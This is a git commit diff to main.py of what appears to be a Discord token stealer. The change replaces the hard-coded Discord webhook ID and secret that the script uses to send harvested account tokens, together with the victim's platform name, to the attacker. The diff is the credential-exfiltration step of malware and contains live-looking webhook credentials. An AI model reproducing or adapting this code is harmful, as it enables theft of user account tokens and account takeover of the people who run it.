6616eda168ad930694b445b81f56bbb566eb2d27
kramber <68190152+kramber268@users.noreply.github.com>
2021-01-17 13:43:16 +0300

    Main Part Of Code 🖥

--- main.py
+++ main.py
@@ -36,6 +36,6 @@ def main():
                 message += f'`{token}`\n\n'
         else:
             message += 'No tokens found.\n'
-        webhook = Webhook.partial(798834381812662292, 'KtHaCiIEIKucF0HvAp77Zezy9ygPIvcChnVjg2mLZE5T59zCQvpzKYQxMI27PPn7E54H', adapter=RequestsWebhookAdapter())
+        webhook = Webhook.partial(800314043604008960, 'zAGRLS5qIId7cqTpbM525BRWeUMdHRlLEpglMSxcNuqD4Xi9RGHOCnuYaC3YknDY0NQE', adapter=RequestsWebhookAdapter())
         webhook.send(f'{platform}\n{message}')
 main()
